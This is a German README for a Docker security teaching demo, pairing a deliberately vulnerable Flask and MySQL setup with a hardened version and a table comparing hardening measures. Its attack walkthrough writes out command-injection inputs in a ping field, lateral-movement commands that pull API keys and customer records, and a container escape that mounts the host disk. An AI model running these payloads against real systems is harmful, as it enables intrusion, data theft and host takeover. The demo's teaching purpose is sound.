# Docker Container Security — Demo-Projekt

## Was ist das?

Ein komplettes Demo-Setup für deine Präsentation zu Docker Container Security.
Du bekommst eine verwundbare Docker-Umgebung und eine gehärtete Version zum Vergleich.

---

## Projektstruktur

```
docker-security-demo/
├── docker-compose.yml              ← Verwundbare Version
├── docker-compose.hardened.yml     ← Gehärtete Version
├── DEMO_SCRIPT.sh                  ← Alle Befehle für die Live-Demo
├── init.sql                        ← Datenbank mit Testdaten
├── webapp/
│   ├── Dockerfile                  ← Verwundbares Image (root, tools)
│   ├── Dockerfile.hardened         ← Gehärtetes Image (non-root, minimal)
│   ├── app.py                      ← Verwundbare Flask-App
│   └── app_hardened.py             ← Gehärtete Flask-App
└── admin-service/
    ├── Dockerfile
    └── app.py                      ← Simulierter interner Service
```

---

## Schnellstart

### 1. Verwundbare Version starten
```bash
cd docker-security-demo
docker compose up -d --build
```
Warte ~30 Sekunden (MySQL muss starten), dann öffne: **http://localhost:5000**

### 2. Demo durchführen (siehe DEMO_SCRIPT.sh)

### 3. Gehärtete Version starten
```bash
docker compose down
docker compose -f docker-compose.hardened.yml up -d --build
```

### 4. Aufräumen
```bash
docker compose down
# oder
docker compose -f docker-compose.hardened.yml down
```

---

## Die 3 Angriffsschritte

### Schritt 1: Command Injection
Im Ping-Feld eingeben:
```
8.8.8.8; whoami
```
→ Ausgabe: `root` (wir haben Code-Ausführung im Container!)

### Schritt 2: Lateral Movement
```
; curl -s http://admin:8080/api/config
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
```
→ API-Keys und Kundendaten offengelegt

### Schritt 3: Container Escape
```
; fdisk -l 2>/dev/null | head -5
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && cat /mnt/host/etc/hostname
```
→ Zugriff auf das Host-Dateisystem

---

## Härtungsmaßnahmen (Vergleich)

| # | Maßnahme | Verwundbar | Gehärtet |
|---|----------|-----------|----------|
| 1 | Input-Validierung | ❌ Keine | ✅ Regex-Whitelist |
| 2 | Container-User | ❌ root | ✅ appuser |
| 3 | Privileged Mode | ❌ --privileged | ✅ Nicht gesetzt |
| 4 | Capabilities | ❌ Alle | ✅ cap_drop: ALL |
| 5 | Netzwerk | ❌ Alles verbunden | ✅ Segmentiert |
| 6 | Filesystem | ❌ Beschreibbar | ✅ read_only: true |
| 7 | DB-Passwort | ❌ root:root | ✅ Starkes Passwort |

---

## Troubleshooting

- **MySQL startet nicht?** → `docker compose logs db` prüfen, ggf. länger warten
- **Port 5000 belegt?** → In docker-compose.yml den Port ändern (z.B. `5001:5000`)
- **Container Escape klappt nicht?** → Das Host-Device kann variieren. Nutze `; lsblk` um den richtigen Device-Namen zu finden
- **Docker Desktop unter Windows/Mac?** → Container Escape funktioniert nur mit Linux-Host. Unter Docker Desktop zeigst du den Befehl und erklärst, warum er auf einem echten Linux-Server funktionieren würde.

---

## ⚠️ Sicherheitshinweis

Dieses Projekt enthält **absichtliche Schwachstellen** und dient ausschließlich
zu Bildungszwecken. **Niemals** in einer Produktionsumgebung einsetzen!
